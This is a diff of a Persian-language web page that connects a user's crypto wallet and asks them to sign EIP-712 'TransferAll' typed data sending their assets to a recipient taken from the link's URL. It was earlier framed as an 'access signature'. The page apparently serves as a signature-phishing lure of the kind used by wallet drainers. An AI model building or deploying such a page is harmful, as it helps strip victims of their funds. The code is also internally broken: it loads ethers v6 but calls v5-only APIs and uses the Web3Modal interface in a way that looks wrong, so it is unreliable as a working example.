@@ -1,16 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="fa">
 <head>
-  <meta charset="utf-8" />
-  <title>EIP-712 Sign Link</title>
+  <meta charset="UTF-8">
+  <title>امضای EIP-712 با کیف پول دلخواه</title>
+  <script src="https://unpkg.com/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@web3modal/ethers5@2.5.0/dist/index.umd.js"></script>
+  <style>
+    body { font-family: sans-serif; padding: 2rem; direction: rtl; background: #f9f9f9; }
+    button { padding: 1rem 2rem; font-size: 16px; background: #5c67f2; color: white; border: none; border-radius: 8px; cursor: pointer; }
+    pre { background: #eee; padding: 1rem; border-radius: 6px; margin-top: 1rem; }
+  </style>
 </head>
 <body>
-  <h2>امضای دسترسی</h2>
-  <button onclick="signMessage()">اتصال و امضا</button>
+  <h2>🔐 امضای انتقال دارایی با انتخاب کیف پول</h2>
+  <button id="connect-btn">اتصال و امضا</button>
   <pre id="result"></pre>
 
-  <!-- Ethers باید اول لود بشه -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
-  <script src="app.js"></script>
+  <script>
+    const { Web3Modal, EthersProvider } = window.WEB3MODAL_ETHERS5;
+
+    const projectId = "f90d92aa0fc85c96777dd9041203122b"; // ← این رو جایگزین کن
+
+    const metadata = {
+      name: "Afshin DApp",
+      description: "امضای انتقال با EIP-712",
+      url: "https://eip-7702-public.onrender.com",
+      icons: ["https://eip-7702-public.onrender.com/icon.png"]
+    };
+
+    const modal = new Web3Modal({ projectId, providerOptions: {}, metadata });
+
+    document.getElementById("connect-btn").addEventListener("click", async () => {
+      try {
+        const instance = await modal.connect();
+        const provider = new ethers.providers.Web3Provider(instance);
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+        const network = await provider.getNetwork();
+
+        const url = new URL(window.location.href);
+        const to = url.searchParams.get("to") || "0x000000000000000000000000000000000000dead";
+        const deadline = Math.floor(Date.now() / 1000) + 600;
+
+        const domain = {
+          name: "TransferAll",
+          version: "1",
+          chainId: network.chainId,
+          verifyingContract: "0x0000000000000000000000000000000000000000"
+        };
+
+        const types = {
+          TransferAll: [
+            { name: "from", type: "address" },
+            { name: "to", type: "address" },
+            { name: "deadline", type: "uint256" }
+          ]
+        };
+
+        const message = { from: address, to, deadline };
+        const signature = await signer._signTypedData(domain, types, message);
+
+        document.getElementById("result").innerText =
+          "✅ امضا دریافت شد:\n" + JSON.stringify({ address, signature, message }, null, 2);
+      } catch (err) {
+        document.getElementById("result").innerText = "❌ خطا:\n" + err.message;
+      }
+    });
+  </script>
 </body>
 </html>
